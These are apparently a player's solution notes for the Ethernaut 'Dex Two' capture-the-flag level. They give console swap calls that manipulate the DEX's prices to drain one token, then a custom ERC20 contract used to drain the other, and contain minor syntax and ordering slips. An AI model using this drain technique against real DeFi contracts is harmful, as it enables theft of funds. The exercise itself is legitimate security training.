[23 - Dex Two](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

Token1: 0x42259ce074f426E5FBac1bbE270707cBeada3Fa8
Token2: 0x0dcfF8e59a9cD5f4d90EF977a454C0f1F61c082E

* await contract.approve(contract.address, 10000000);
* await contract.swap(token1, token2, 10);
* await contract.swap(token2, token1, 10);
* await contract.swap(token1, token2, 12);
* const token1 = await contract.token1(); const token2 = await contract.token2();
* await contract.swap(token2, token1, 22);
* await contract.swap(token1, token2, 27);
* await contract.swap(token2, token1, 35);
* await contract.swap(token1, token2, 51);
* await contract.swap(token2, token1, 15);
* await contract.balanceOf(token1, contract.address) gives 0;
* await contract.balanceOf(token2, contract.address) gives 30;

Deploy ERC20
```
// contracts/Token.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Token is ERC20 {
    constructor(uint256 initialSupply) ERC20("Token", "TKN") {
        _mint(msg.sender, initialSupply);
    }
}
```

* myERC20.transfer("0xE28AD5d577A1a45c629972A2728Db6A625e4C071", 30);
* myERC20.approve("0xE28AD5d577A1a45c629972A2728Db6A625e4C071, 30);
* const token3 = "0x6Df581c9a2E57f1241605D0EC43368CE39a4d7b2";
* await contract.swap(token3, token2, 30);

